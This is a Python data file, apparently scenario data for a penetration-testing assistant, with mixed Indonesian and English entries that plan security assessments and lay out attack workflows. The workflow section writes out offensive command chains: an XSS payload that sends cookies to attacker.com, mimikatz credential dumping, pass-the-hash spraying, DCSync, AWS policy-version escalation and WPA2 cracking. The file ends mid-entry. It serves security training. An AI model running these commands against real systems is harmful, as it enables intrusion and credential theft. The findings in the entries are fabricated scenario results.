    _e("plan SQL injection deep-dive assessment",
       ["SQLi deep-dive = beyond automated scanner, manual testing semua injection vectors",
        "focus: blind SQLi, second-order, NoSQL, ORM injection",
        "test di semua input points: URL params, POST body, headers, cookies"],
       ["Phase 1: Input discovery — spider + manual browsing untuk semua inputs",
        "Phase 2: Automated scan — sqlmap level 5, risk 3",
        "Phase 3: Manual testing — payload crafting untuk WAF bypass",
        "Phase 4: Blind SQLi — time-based, boolean-based manual verification",
        "Phase 5: Second-order SQLi — stored input yang digunakan kemudian",
        "Phase 6: NoSQL injection — MongoDB, Redis query injection",
        "Phase 7: ORM injection — Hibernate, SQLAlchemy parameter issues"],
       ["input_discover","automated_scan","manual_waf_bypass","blind_test","second_order","nosql","orm"],
       [("sqlmap","automated SQLi"),("burpsuite","manual testing"),("ffuf","input fuzzing")],
       "WAF bypass untuk SQLi: comment injection, encoding, case variation — infinite variations",
       "SQLi deep-dive: 5 endpoints vulnerable, 2 blind time-based, 1 second-order",
       "SQL injection specialist",
       "SQLi deep-dive: automated scan → 2 confirmed. Manual testing → 5 total, 1 second-order!"),

    _e("plan OAuth dan SSO security assessment",
       ["OAuth/SSO assessment = test identity federation security",
        "attack surface: redirect_uri, state, PKCE, token storage, scope",
        "test semua OAuth flows: authorization code, implicit, client credentials"],
       ["Phase 1: Flow mapping — identify semua OAuth/OIDC implementations",
        "Phase 2: redirect_uri bypass — open redirect, path traversal, regex bypass",
        "Phase 3: state parameter — CSRF protection check",
        "Phase 4: Token analysis — JWT weakness, token leakage in URL",
        "Phase 5: Scope testing — over-permission, scope escalation",
        "Phase 6: PKCE check — authorization code interception",
        "Phase 7: Token storage — localStorage, cookie flags"],
       ["flow_map","redirect_test","state_csrf","jwt_test","scope_check","pkce_test","storage_audit"],
       [("burpsuite","OAuth flow testing"),("jwt_tool","JWT analysis and attack")],
       "redirect_uri validation adalah most common OAuth flaw — always test exhaustively",
       "SSO assessment: 3 OAuth flows, redirect_uri bypass found, JWT weak secret, no PKCE",
       "identity security analyst",
       "OAuth assessment: flow mapping → 3 implementations. redirect_uri bypass confirmed!"),

    _e("design threat intelligence program untuk SOC",
       ["TI program = collect → process → analyze → disseminate → feedback",
        "internal sources: SIEM logs, IR findings, honeypot data",
        "external sources: commercial feeds, ISACs, OSINT"],
       ["Phase 1: Requirements — what threats matter untuk bisnis ini?",
        "Phase 2: Source selection — commercial feed, ISAC, OSINT, dark web",
        "Phase 3: Platform — MISP, OpenCTI untuk TI management",
        "Phase 4: Integration — SIEM enrichment, firewall block feed",
        "Phase 5: Analysis — indicator scoring, actor tracking",
        "Phase 6: Dissemination — report format per audience (exec, SOC, IR)",
        "Phase 7: Feedback loop — measure TI effectiveness"],
       ["requirements","source_select","platform_deploy","siem_integrate","analysis","disseminate","feedback"],
       [("misp","malware information sharing platform"),("opencti","open source TI platform"),
        ("mitre attack","TTP framework")],
       "quality over quantity untuk TI — 100 high-quality indicators > 10000 noisy IOCs",
       "TI program: 3 commercial feeds + ISAC, MISP deployed, 85% IOC hit rate dalam 90 hari",
       "threat intelligence program manager",
       "TI program design. MISP deployed, integrating 3 feeds. Phase 4: SIEM enrichment setup."),

    _e("plan cloud native application security assessment (CNAPP)",
       ["CNAPP = cloud native application protection platform assessment",
        "scope: IaC security, CSPM, workload protection, container security",
        "shift left: detect misconfig di IaC sebelum deploy"],
       ["Phase 1: IaC scanning — terraform/cloudformation dengan checkov atau tfsec",
        "Phase 2: CSPM — cloud misconfiguration assessment (prowler/scoutsuite)",
        "Phase 3: Workload — container runtime security (Falco), K8s audit",
        "Phase 4: Application — DAST pada deployed apps",
        "Phase 5: Data security — classification, DLP, encryption",
        "Phase 6: Identity — CIEM (Cloud Infrastructure Entitlement Management)"],
       ["iac_scan","cspm_assess","workload_protect","app_dast","data_security","identity_ciem"],
       [("checkov","IaC security scanner"),("prisma cloud","CNAPP platform"),
        ("falco","runtime security")],
       "IaC scanning = catch misconfig sebelum reach production — highest ROI",
       "CNAPP assessment: 45 IaC misconfigs, 12 runtime violations, 3 exposed workloads",
       "cloud native security architect",
       "CNAPP assessment: checkov IaC scan → 45 findings. CSPM: prowler → 12 critical."),

    _e("plan email security assessment dan anti-phishing controls",
       ["email security = SPF, DKIM, DMARC, gateway filtering, user training",
        "test: email spoofing, attachment bypass, URL bypass, BEC simulation",
        "assess inbound dan outbound email security controls"],
       ["Phase 1: DNS config — SPF, DKIM, DMARC check dan policy review",
        "Phase 2: Email spoofing — attempt to send spoof dari target domain",
        "Phase 3: Gateway bypass — malicious attachment dengan various encoding",
        "Phase 4: URL bypass — obfuscated URLs, redirectors, QR code phishing",
        "Phase 5: BEC simulation — executive impersonation via display name spoofing",
        "Phase 6: User testing — targeted phishing simulation",
        "Phase 7: O365/Google Workspace security config audit"],
       ["dns_audit","spoof_test","gateway_bypass","url_bypass","bec_sim","user_test","platform_audit"],
       [("swaks","SMTP testing tool"),("gophish","phishing platform"),
        ("mailspoofcheck","email security checker")],
       "DMARC p=reject adalah single most important email security control",
       "email assessment: DMARC missing, domain spoofable, attachment bypass via ISO file",
       "email security assessor",
       "Email security: DMARC check → p=none only! Spoofing test → success! BEC risk high."),

    _e("design network segmentation review dan testing plan",
       ["network segmentation = limit lateral movement via VLAN dan firewall rules",
        "test: can attacker dalam segment A reach segment B yang seharusnya isolated?",
        "firewall rule review + practical testing"],
       ["Phase 1: Architecture review — network diagram, VLAN design, firewall placement",
        "Phase 2: Firewall rule audit — ACL review untuk each segment boundary",
        "Phase 3: Practical testing — dari each segment, test reach ke others",
        "Phase 4: East-west traffic — server-to-server communication mapping",
        "Phase 5: DMZ testing — DMZ ke internal network reachability",
        "Phase 6: Remote access — VPN segmentation, split tunneling"],
       ["arch_review","acl_audit","practical_test","east_west_map","dmz_test","vpn_review"],
       [("nmap","cross-segment reachability testing"),("hping3","packet crafting untuk bypass test")],
       "firewall policy gap = non-obvious allowed traffic yang tidak seharusnya ada",
       "network review: DMZ→internal reach on port 445, server VLAN tidak segmented dari dev",
       "network security architect",
       "Network segmentation: DMZ test → port 445 to internal reachable! Rule review: 340 ACLs."),

    _e("plan credential management security assessment",
       ["credential management = password policy, MFA, PAM, vault, rotation",
        "test: default passwords, weak passwords, password reuse, shared accounts",
        "assess: privileged account management (PAM) solution"],
       ["Phase 1: Password policy review — minimum length, complexity, lockout",
        "Phase 2: Default credential scan — network devices, applications",
        "Phase 3: Password reuse test — spray known breached passwords",
        "Phase 4: MFA coverage audit — which systems enforce MFA?",
        "Phase 5: Privileged account review — admin account inventory",
        "Phase 6: Service account audit — non-rotating, shared service creds",
        "Phase 7: Vault implementation — secrets management maturity"],
       ["policy_review","default_scan","reuse_test","mfa_audit","priv_review","svc_account","vault_check"],
       [("nmap","default cred scan"),("crackmapexec","credential testing"),
        ("hashcat","password cracking assessment")],
       "service account passwords yang tidak pernah rotate = kerberoasting goldmine",
       "cred assessment: 15 service accounts no rotation >3 years, MFA 60% coverage, 5 defaults",
       "credential management assessor",
       "Credential assessment: default scan → 5 network devices with default creds! MFA audit: 60%"),

    _e("plan security logging dan monitoring effectiveness review",
       ["logging review = apakah semua security-relevant events dicatat dan dideteksi?",
        "detection gap analysis: map logging coverage vs MITRE ATT&CK",
        "SIEM rule quality: TP rate, FP rate, coverage"],
       ["Phase 1: Log source inventory — apa yang di-log dan apa yang tidak?",
        "Phase 2: MITRE coverage mapping — untuk setiap technique, ada detection?",
        "Phase 3: SIEM rule audit — active rules, TP/FP rate review",
        "Phase 4: Retention review — log retention policy vs incident investigation need",
        "Phase 5: Alert quality — mean time to detect (MTTD) measurement",
        "Phase 6: Practical detection test — execute techniques, verify alert fired"],
       ["log_inventory","mitre_map","rule_audit","retention_review","alert_quality","detection_test"],
       [("atomic red team","detection testing"),("sigma","detection rule framework"),
        ("splunk","SIEM query testing")],
       "detection gap analysis adalah most valuable output dari logging review",
       "logging review: 45% MITRE coverage, MTTD 4.5 hours, 23 critical techniques undetected",
       "detection engineering lead",
       "Logging review: MITRE mapping → 45% coverage. Testing undetected techniques..."),

    _e("plan data loss prevention (DLP) effectiveness assessment",
       ["DLP assessment = test apakah sensitive data bisa keluar melalui berbagai channel",
        "channel: email, USB, cloud upload, printing, screenshot",
        "test dengan fake PII/credit card data, bukan real data"],
       ["Phase 1: DLP policy review — rules, actions, bypass exceptions",
        "Phase 2: Email exfil test — send fake PII via email (internal dan external)",
        "Phase 3: Web upload test — upload sensitive file ke personal cloud (Dropbox, etc)",
        "Phase 4: USB test — copy sensitive file ke USB drive",
        "Phase 5: Printing test — print sensitive document",
        "Phase 6: Screenshot test — screenshot sensitive data",
        "Phase 7: Steganography — embed data dalam image"],
       ["policy_review","email_test","web_upload_test","usb_test","print_test","screenshot_test","steg_test"],
       [("openDLP","open source DLP testing"),("python","custom data tagging and tracking")],
       "DLP bypass via steganography sering tidak detected — often a gap in DLP implementations",
       "DLP assessment: email → blocked, USB → blocked, Dropbox web upload → NOT blocked!",
       "DLP assessment specialist",
       "DLP test: email send → blocked. Web upload → Dropbox allowed! Steg bypass → not detected."),

    _e("design security operations center (SOC) maturity assessment",
       ["SOC maturity = people, process, technology evaluation",
        "maturity levels: 1 (reactive) → 5 (predictive)",
        "benchmark terhadap SOC-CMM atau MITRE framework"],
       ["Phase 1: Technology review — tool coverage, integration, automation level",
        "Phase 2: Process review — playbook quality, escalation workflow, SLA",
        "Phase 3: People review — analyst skill level, training, retention",
        "Phase 4: Detection coverage — MITRE ATT&CK visibility mapping",
        "Phase 5: Response capability — IR plan, tabletop exercise",
        "Phase 6: Threat intel — integration dengan TI feeds, IOC operationalization",
        "Phase 7: Maturity score + roadmap"],
       ["tech_review","process_review","people_review","detection_map","response_cap","ti_integration","roadmap"],
       [("atomic red team","detection testing"),("mitre attack navigator","coverage visualization")],
       "people dan process lebih penting dari technology dalam SOC maturity",
       "SOC assessment: Level 2.3/5. Gap: no threat hunting, no purple team, 45% MITRE coverage",
       "SOC maturity assessor",
       "SOC maturity assessment: Level 2.3. Key gaps: threat hunting, purple team, 55% uncovered."),

    _e("plan security review untuk third-party vendor",
       ["vendor security review = assess keamanan vendor yang memiliki akses ke data/system kita",
        "scope: SOC2 report review, questionnaire, technical testing jika applicable",
        "risk-based: tier vendor berdasarkan data access dan criticality"],
       ["Phase 1: Vendor tiering — critical, high, medium, low berdasarkan risk",
        "Phase 2: Documentation review — SOC2 Type II, ISO 27001, penetration test report",
        "Phase 3: Security questionnaire — standard VSAQ atau custom",
        "Phase 4: Technical assessment — API security, access control review (jika applicable)",
        "Phase 5: Contract review — DPA, SLA, breach notification requirements",
        "Phase 6: Ongoing monitoring — annual reassessment, incident notification tracking"],
       ["vendor_tier","doc_review","questionnaire","technical_assess","contract_review","ongoing_monitor"],
       [("vendor portal","vendor security management platform")],
       "kritial vendor tanpa SOC2 = unacceptable risk — require atau find alternative",
       "vendor review: 5 critical vendors, 2 tanpa SOC2, 1 failed technical assessment",
       "vendor risk management specialist",
       "Vendor review: 5 critical vendors. 2 tanpa SOC2 = unacceptable risk. Remediation required."),

    _e("plan penetration test untuk thick client application",
       ["thick client = desktop application yang communicate dengan server",
        "testing: client-side code, traffic interception, binary analysis, API testing",
        "tools: procmon, wireshark, dnspy/ILSpy untuk .NET, jadx untuk Java"],
       ["Phase 1: Traffic analysis — burpsuite proxy atau wireshark untuk capture",
        "Phase 2: Binary analysis — dnspy (.NET), jadx (Java), ghidra (native)",
        "Phase 3: Registry dan filesystem — procmon untuk data storage analysis",
        "Phase 4: Memory analysis — sensitive data in memory (credentials, keys)",
        "Phase 5: Protocol testing — custom protocol fuzzing",
        "Phase 6: Authentication bypass — local bypass, license bypass",
        "Phase 7: Server-side API testing — gunakan burpsuite untuk server requests"],
       ["traffic_capture","binary_analysis","storage_review","memory_check","protocol_fuzz","auth_bypass","api_test"],
       [("burpsuite","traffic interception"),("dnspy",".NET decompiler"),
        ("procmon","filesystem and registry monitor")],
       "proxy setup untuk thick client sering butuh custom certificate installation",
       "thick client: hardcoded credentials in binary, plaintext sensitive data in temp files",
       "thick client security tester",
       "Thick client: binary analysis dnspy → hardcoded API key! Procmon → plaintext in temp files."),

    _e("plan purple team exercise untuk detection improvement",
       ["purple team = red team attack + blue team detection dalam kolaborasi",
        "tujuan: improve detection coverage, tidak sekedar test",
        "iterative: attack → detect → tune → reattack"],
       ["Phase 1: Planning — select TTPs berdasarkan threat landscape",
        "Phase 2: Red team execute technique (diketahui blue team)",
        "Phase 3: Blue team verify apakah alert fired",
        "Phase 4: Jika tidak detected: tune detection rule bersama",
        "Phase 5: Retest setelah tuning — verify detection works",
        "Phase 6: Document: TTP, detection method, rule, FP rate",
        "Phase 7: Coverage metrics — before/after MITRE coverage"],
       ["ttp_select","red_execute","blue_verify","rule_tune","retest","document","metrics"],
       [("atomic red team","TTP execution"),("sigma","detection rules"),
        ("caldera","automated adversary simulation")],
       "purple team meningkatkan detection coverage lebih cepat dari red team alone",
       "purple team: 30 TTPs tested, 18 detected → tune → 27/30 detected (90% coverage)",
       "purple team coordinator",
       "Purple team: 30 TTPs. Round 1: 18/30 detected. Tuning 12 rules. Round 2: 27/30!"),

    _e("plan web application firewall (WAF) bypass testing",
       ["WAF bypass = find techniques yang tidak dideteksi oleh WAF rules",
        "approach: fingerprint → analyze rules → craft bypass payload",
        "category bypass: SQLi, XSS, RCE, path traversal, command injection"],
       ["Phase 1: WAF fingerprint — wafw00f untuk identify vendor",
        "Phase 2: Basic payload test — verify default blocking",
        "Phase 3: Encoding bypass — URL encoding, HTML encoding, unicode",
        "Phase 4: Case manipulation — MixedCase untuk rule bypass",
        "Phase 5: Comment injection — SQL: /**/, XSS: <!-->",
        "Phase 6: Chunked transfer encoding bypass",
        "Phase 7: HTTP header injection — X-Forwarded-For: 127.0.0.1"],
       ["waf_fingerprint","baseline_block","encoding_test","case_test","comment_inject","chunked_test","header_bypass"],
       [("wafw00f","WAF detection"),("burpsuite","WAF bypass testing"),
        ("sqlmap","SQLi WAF bypass modes")],
       "WAF bypass adalah never-ending game — document bypass techniques per WAF vendor",
       "ModSecurity bypass: SQL comment injection /**/ + case variation bypass rate 40%",
       "WAF bypass specialist",
       "WAF bypass: wafw00f → ModSecurity. Bypass: /**/ comment + case mix → 40% rule bypass!"),

    _e("design kubernetes namespace isolation security test",
       ["K8s namespace isolation = prevent pod-to-pod cross-namespace traffic",
        "test: network policy enforcement, RBAC namespace boundary",
        "default K8s: NO network isolation — semua pod bisa talk ke semua pod"],
       ["Phase 1: Network policy audit — apakah network policies exist?",
        "Phase 2: Cross-namespace reachability test",
        "Phase 3: Service account RBAC — can SA dari namespace A access namespace B?",
        "Phase 4: Secrets access — cross-namespace secret access",
        "Phase 5: Ingress isolation — apakah ingress rules cukup restrictive?",
        "Phase 6: Container privilege — privileged pods cross-namespace impact"],
       ["netpol_audit","reachability_test","rbac_check","secret_check","ingress_review","priv_test"],
       [("kubectl","K8s CLI testing"),("kube-hunter","K8s security scanner")],
       "default K8s tanpa network policy = flat network, zero isolation — critical finding",
       "K8s namespace test: dev → prod namespace reachable, 0 network policies, SA over-permissioned",
       "Kubernetes namespace security analyst",
       "K8s isolation: curl prod-service from dev pod → accessible! No network policies found!"),

    _e("plan full-stack application security assessment",
       ["full-stack = frontend, API, backend, database, infrastructure semuanya",
        "vertical assessment: trace dari user input → database untuk find injection points",
        "horizontal: setiap layer punya distinct attack surface"],
       ["Layer 1: Frontend — XSS, CSRF, CSP bypass, client-side storage",
        "Layer 2: API Gateway — auth, rate limit, input validation",
        "Layer 3: Backend services — business logic, injection, SSRF",
        "Layer 4: Database — SQL injection, NoSQL injection, stored proc",
        "Layer 5: Cache — cache poisoning, data leakage via cache",
        "Layer 6: Infrastructure — cloud misconfiguration, container security",
        "Layer 7: Secrets — API keys, database creds, service account tokens"],
       ["frontend","api_gateway","backend","database","cache","infrastructure","secrets"],
       [("burpsuite","full web proxy"),("sqlmap","database testing"),
        ("nuclei","infrastructure scanning")],
       "trace user input end-to-end untuk find injection points yang melewati multiple layers",
       "full-stack assessment: XSS frontend, SQLi backend, Redis no-auth cache, S3 public",
       "full-stack security tester",
       "Full-stack assessment: 7 layers. Frontend: XSS found. API: JWT weak. DB: SQLi!"),

    _e("plan security posture improvement roadmap setelah pentest",
       ["post-pentest roadmap = prioritized remediation plan berdasarkan findings",
        "quick wins vs long-term strategic improvements",
        "track remediation progress dengan metrics"],
       ["Week 1-2: Critical findings — immediate patch atau mitigation",
        "Month 1: High findings — systematic remediation",
        "Month 2-3: Medium findings — planned remediation",
        "Quarter 2: Security program improvements — policies, training, tooling",
        "Quarter 3: Advanced controls — WAF, EDR, SIEM improvement",
        "Quarter 4: Re-assessment — validate improvements via pentest atau red team",
        "Ongoing: Vulnerability management program untuk continuous improvement"],
       ["critical_patch","high_remediate","medium_plan","program_improve","tool_upgrade","reassess","continuous_vm"],
       [("jira","remediation tracking"),("nessus","ongoing vulnerability scanning")],
       "remediation tanpa verification = tidak ada jaminan fix works — selalu verify",
       "roadmap: 3 critical patched week 1, 12 high remediated month 1, rescan: 0 critical",
       "security program manager",
       "Post-pentest roadmap: 3 critical patched week 1. High findings sprint 2. Rescan scheduled."),
]

WORKFLOW_DATA = [
    _e("full recon workflow untuk corp.target.com",
       ["tahap recon adalah fondasi, kualitas input menentukan kualitas output",
        "passive dulu → tidak ada fingerprint di target logs",
        "validate setiap output sebelum gunakan sebagai input tool berikutnya"],
       ["subfinder -d corp.target.com -silent -o subdomains.txt",
        "cat subdomains.txt | dnsx -silent -o resolved.txt",
        "cat resolved.txt | httpx -silent -title -status-code -o live.txt",
        "nmap -iL resolved.txt -T4 --open -sV -oN ports.txt",
        "nuclei -l live.txt -severity medium,high,critical -o findings.txt"],
       ["passive_recon","dns_validate","http_probe","port_scan","vuln_scan","report"],
       [("subfinder","subdomain enum"),("dnsx","DNS resolve"),
        ("httpx","HTTP probe"),("nmap","port scan"),("nuclei","vuln scan")],
       "chain output file langsung sebagai input tool berikutnya untuk efisiensi",
       "corp.target.com — 45 subdomain, 32 resolved, 18 live, 5 critical findings",
       "automated recon workflow",
       "Recon chain dimulai. subfinder → dnsx → httpx → nmap → nuclei"),

    _e("web vulnerability assessment workflow untuk https://api.target.com",
       ["API endpoint berbeda dari web biasa — fokus pada authentication, rate limit, data exposure",
        "parameter discovery penting untuk API: ffuf dengan wordlist API-specific",
        "test setiap endpoint dengan method yang berbeda: GET, POST, PUT, DELETE"],
       ["ffuf -u https://api.target.com/FUZZ -w api-endpoints.txt -mc 200,201,401,403",
        "nuclei -u https://api.target.com -t nuclei-templates/",
        "sqlmap -u 'https://api.target.com/user?id=1' --dbs",
        "nikto -h https://api.target.com"],
       ["endpoint_discover","template_scan","injection_test","auth_test","report"],
       [("ffuf","API endpoint fuzzing"),("nuclei","template scan"),
        ("sqlmap","injection test"),("nikto","web scan")],
       "API testing butuh authentication token valid — setup dulu sebelum scan",
       "api.target.com — IDOR pada /user/{id}, SQLi pada /search, no rate limit",
       "API security tester",
       "API assessment: ffuf endpoint discovery → 23 endpoints found, testing each..."),

    _e("privilege escalation workflow setelah initial shell di Linux",
       ["initial foothold sebagai www-data atau low-priv user",
        "enumerate semua PE vectors sistematis sebelum attempt",
        "LinPEAS adalah automated, tapi review manual tetap penting"],
       ["whoami && id && uname -a",
        "python3 -c 'import pty; pty.spawn(\"/bin/bash\")' (upgrade shell)",
        "./linpeas.sh | tee linpeas_output.txt",
        "sudo -l",
        "find / -perm -4000 2>/dev/null",
        "cat /etc/crontab"],
       ["shell_upgrade","auto_enum","sudo_check","suid_check","cron_check"],
       [("linpeas","automated Linux PE checker")],
       "LinPEAS output sering banyak — fokus pada MERAH/KUNING dulu",
       "www-data → SUID /usr/bin/find → root via find -exec",
       "Linux privilege escalation",
       "PE enum: whoami=www-data → LinPEAS → SUID find detected!"),

    _e("wireless pentest workflow: WPA2 crack dan MITM",
       ["wireless pentest dibagi: pasif (capture) dan aktif (inject/MITM)",
        "harus miliki permission explicit dari owner jaringan"],
       ["airmon-ng check kill","airmon-ng start wlan0",
        "airodump-ng wlan0mon (discover networks)",
        "airodump-ng wlan0mon -c {channel} --bssid {BSSID} -w capture",
        "aireplay-ng -0 5 -a {BSSID} wlan0mon",
        "hashcat -m 22000 capture.hc22000 rockyou.txt",
        "airmon-ng stop wlan0mon"],
       ["interface_prep","network_discover","target_capture","deauth","crack","cleanup"],
       [("airmon-ng","monitor mode"),("airodump-ng","capture"),
        ("aireplay-ng","deauth"),("hashcat","crack")],
       "WPA3 tidak bisa di-crack dengan cara ini — check security mode dulu",
       "WPA2 handshake captured, PSK ditemukan",
       "wireless security assessor",
       "Monitor mode aktif. Capturing pada channel 6, BSSID target..."),

    _e("cloud misconfiguration hunt workflow di AWS",
       ["cloud misconfiguration adalah low-hanging fruit yang sering diabaikan",
        "urutan: identity → network → storage → monitoring"],
       ["aws sts get-caller-identity",
        "prowler aws -M json -o results/",
        "aws s3api list-buckets",
        "aws s3api get-bucket-acl --bucket {name}",
        "aws ec2 describe-security-groups",
        "aws iam list-users",
        "trufflehog aws --region us-east-1"],
       ["auth_verify","full_audit","s3_enum","sg_check","iam_enum","secret_scan","report"],
       [("prowler","AWS audit"),("aws CLI","resource enum"),("trufflehog","secret scan")],
       "s3:GetObject dengan public ACL = data exposure — prioritas tertinggi",
       "AWS — 3 public S3 buckets (PII data), 5 SGs 0.0.0.0/0, 1 hardcoded key",
       "cloud security engineer",
       "AWS audit: prowler → 15 critical findings. S3 public buckets: 3."),

    _e("malware analysis workflow: static ke dynamic",
       ["always static dulu sebelum dynamic — lebih aman dan dapat IOC untuk monitoring"],
       ["file malware.bin","sha256sum malware.bin",
        "strings -n 8 malware.bin | tee strings.txt",
        "floss malware.bin > floss.txt",
        "yara /usr/share/yara-rules/ malware.bin",
        "cape submit malware.bin",
        "review cape report: IOCs, behavior, C2",
        "yarGen.py -m malware.bin -o new_rules.yar"],
       ["hash_gen","static_strings","obfusc_extract","rule_match","sandbox","ioc_extract","rule_gen"],
       [("strings","string extract"),("floss","obfuscated strings"),
        ("yara","rule matching"),("capev2","dynamic sandbox")],
       "upload hash ke VirusTotal sebelum full analysis — mungkin sudah diketahui",
       "malware.bin — trojan dropper, C2: 185.220.101.45:4444, persistence: HKCU Run",
       "malware analyst",
       "Static analysis: strings extraction → C2 IP detected. Submitting ke CAPEv2 sandbox."),

    _e("Active Directory compromise workflow dari domain user ke domain admin",
       ["AD compromise = systematic path dari normal user ke full domain control",
        "bloodhound untuk identify shortest path",
        "kerberoasting sering fastest path jika SPN accounts exist"],
       ["bloodhound-python -u user -p pass -d domain.local -c All (collect)",
        "upload ke BloodHound GUI, query shortest path ke DA",
        "impacket-GetUserSPNs domain.local/user:pass -request (kerberoasting)",
        "hashcat -m 13100 spn_hashes.txt rockyou.txt (crack TGS)",
        "crackmapexec smb 10.0.0.0/24 -u svc_sql -p cracked_pass (lateral)",
        "impacket-secretsdump domain.local/svc_sql@DC_IP (dcsync)",
        "impacket-psexec domain.local/administrator:hash@target (admin access)"],
       ["ad_collect","path_query","kerberoast","tgs_crack","lateral_move","dcsync","da_access"],
       [("bloodhound","AD path mapping"),("impacket","Windows attacks"),
        ("hashcat","credential cracking"),("crackmapexec","lateral movement")],
       "document setiap step dengan timestamp untuk report narrative",
       "domain.local — user → kerberoast svc_sql → crack → DCSync → domain admin",
       "AD attack workflow",
       "AD compromise: BloodHound path found. Kerberoasting svc_sql → hashcat → DCSync!"),

    _e("web application XSS to account takeover workflow",
       ["XSS account takeover = steal session cookie atau perform CSRF via XSS",
        "stored XSS lebih powerful dari reflected karena affect semua victims",
        "cookie stealing butuh: no HttpOnly flag pada session cookie"],
       ["dalfox url https://target.com/?q=test (automated XSS scan)",
        "manual test: inject <script>document.location='http://attacker.com/'+document.cookie</script>",
        "setup listener: nc -lvnp 80 (atau burp collaborator)",
        "jika stored XSS: injected payload executed pada setiap visit",
        "steal cookie dari attacker server log",
        "replay cookie: burpsuite → change session cookie → access victim account"],
       ["xss_discover","stored_test","cookie_steal_setup","listener_setup","cookie_capture","session_hijack"],
       [("dalfox","XSS scanner"),("burpsuite","session hijacking via cookie replay")],
       "HttpOnly cookie tidak bisa dicuri via JS — check network tab untuk cookie flags",
       "target.com — stored XSS pada comment field, session cookie stolen, admin access",
       "XSS attack chain analyst",
       "Stored XSS confirmed! Cookie listener: nc -lvnp 80 → cookie received → account access!"),

    _e("post-exploitation workflow setelah RCE pada web server",
       ["setelah RCE: stabilize shell → enumerate → escalate → persist",
        "urutan penting: jangan langsung PE tanpa understand environment"],
       ["python3 -c 'import pty;pty.spawn(\"/bin/bash\")' (stabilize)",
        "export TERM=xterm; stty raw -echo; fg (full TTY)",
        "whoami && id && hostname && ip addr (basic enum)",
        "cat /etc/passwd | grep -v nologin (local users)",
        "./linpeas.sh (automated PE check)",
        "find / -name '*.conf' -o -name '*.env' 2>/dev/null | head (config files)",
        "ps aux | grep -v '\]' (running services)"],
       ["shell_stabilize","tty_upgrade","basic_enum","user_enum","pe_check","config_hunt","process_enum"],
       [("linpeas","Linux enumeration"),("python","shell stabilization")],
       "shell stabilization penting sebelum apapun — unstable shell kehilangan semua progress",
       "web server www-data → full TTY → config files berisi DB creds → mysql login",
       "post-RCE workflow",
       "RCE → stable shell → enum: www-data, /var/www/.env berisi DB_PASSWORD!"),

    _e("mobile app API security testing workflow",
       ["mobile app → extract APK → SSL bypass → proxy traffic → test API",
        "API endpoints dari mobile app sering tidak di-test oleh web pentest"],
       ["apktool d target.apk (decompile)",
        "grep -r 'http' target/smali/ | grep -i api (find API endpoints)",
        "adb connect 192.168.1.50 (connect ke device/emulator)",
        "frida -U -l ssl-pinning-bypass.js -f com.target.app (SSL bypass)",
        "burpsuite proxy: configure mobile device proxy ke laptop",
        "intercept dan test semua API calls dari mobile app",
        "test: IDOR, auth bypass, injection pada mobile-specific endpoints"],
       ["apk_decompile","endpoint_discover","device_connect","ssl_bypass","proxy_setup","api_test"],
       [("apktool","APK decompilation"),("frida","dynamic instrumentation"),
        ("burpsuite","API traffic interception")],
       "mobile API endpoints sering memiliki weaker validation dari web endpoints",
       "mobile app — 12 unique API endpoints, 3 IDOR, 1 SQLi (mobile-only endpoint)",
       "mobile app security tester",
       "Mobile pentest: apktool → endpoints found. frida SSL bypass → burpsuite capturing traffic."),

    _e("network pivot workflow dari DMZ ke internal network",
       ["pivot = menggunakan compromised host sebagai hop untuk reach isolated network",
        "DMZ host dengan dual-NIC = bridge antara DMZ dan internal",
        "SSH tunneling atau meterpreter routing untuk pivot"],
       ["identify: ip addr → host dengan 2 network interfaces",
        "port forward via SSH: ssh -L 8080:internal.host:80 dmz_host",
        "socks proxy: ssh -D 9050 dmz_host → proxychains untuk route traffic",
        "meterpreter: run post/multi/manage/autoroute (auto pivot setup)",
        "nmap via socks: proxychains nmap -sT -Pn 10.10.10.0/24",
        "exploit internal targets via pivot"],
       ["dual_nic_identify","ssh_forward","socks_setup","meterpreter_route","internal_scan","internal_exploit"],
       [("ssh","SSH tunneling untuk pivot"),("proxychains","SOCKS proxy routing"),
        ("metasploit","meterpreter routing")],
       "proxychains hanya support TCP — UDP-based tools tidak akan work via SOCKS proxy",
       "DMZ pivot: dual-NIC host, SOCKS proxy via SSH, internal 10.10.10.0/24 scanned",
       "network pivot specialist",
       "Pivot setup: SSH SOCKS proxy → proxychains nmap internal → 12 hosts found!"),

    _e("credentials dump dan reuse workflow dalam Active Directory",
       ["credential reuse = satu set credential yang works di multiple systems",
        "setelah dump credentials: spray ke seluruh network untuk find reuse"],
       ["mimikatz # privilege::debug (enable debug privilege)",
        "mimikatz # sekurlsa::logonpasswords (dump credentials)",
        "save output ke file: > creds.txt",
        "extract NTLM hashes dan cleartext dari output",
        "crackmapexec smb 10.0.0.0/24 -u user_list -p password_list --no-bruteforce (spray)",
        "crackmapexec smb 10.0.0.0/24 -u admin -H NTLM_HASH (PtH spray)",
        "document: which hosts respond, what access level"],
       ["priv_enable","cred_dump","hash_extract","smb_spray","pth_spray","access_map"],
       [("mimikatz","credential dumping"),("crackmapexec","credential spraying")],
       "NTLM hash reuse sering lebih productive dari cleartext — PtH attack",
       "mimikatz: 5 sets cleartext, 12 NTLM hashes → spray → 8 additional hosts compromised",
       "credential harvesting specialist",
       "Mimikatz: sekurlsa → 5 cleartext, 12 NTLM. CrackMapExec spray → 8 more hosts!"),

    _e("cloud privilege escalation workflow di AWS",
       ["AWS PE = dari low-priv IAM user ke AdministratorAccess",
        "enumerate permissions dulu sebelum execute PE",
        "common PE paths: IAM policy creation, Lambda, EC2 role assumption"],
       ["aws sts get-caller-identity (who am I?)",
        "pacu: run iam__enum_permissions (enumerate permissions)",
        "pacu: run iam__privesc_scan (identify PE paths)",
        "jika iam:CreatePolicyVersion: buat policy version dengan AdministratorAccess",
        "aws iam create-policy-version --policy-arn ARN --policy-document admin.json --set-as-default",
        "verify: aws iam get-policy --policy-arn ARN (confirm new version active)",
        "test: aws s3 ls (verify admin access)"],
       ["identity_check","perm_enum","pe_path_id","policy_create","admin_verify"],
       [("pacu","AWS exploitation"),("aws CLI","IAM manipulation")],
       "log semua API calls ke CloudTrail — minimize noise dengan hanya call yang diperlukan",
       "AWS PE: iam:CreatePolicyVersion → admin policy → AdministratorAccess dalam 5 menit",
       "cloud privilege escalation analyst",
       "AWS PE: pacu enum → CreatePolicyVersion available! Creating admin policy version..."),

    _e("forensics investigation workflow untuk suspected breach",
       ["breach investigation = collect evidence → analyze → timeline → attribution",
        "chain of custody dari awal: dokumentasikan setiap action",
        "preserve before analyze: image dulu sebelum analisa"],
       ["memory dump: winpmem atau dumpit (Windows), LiME (Linux)",
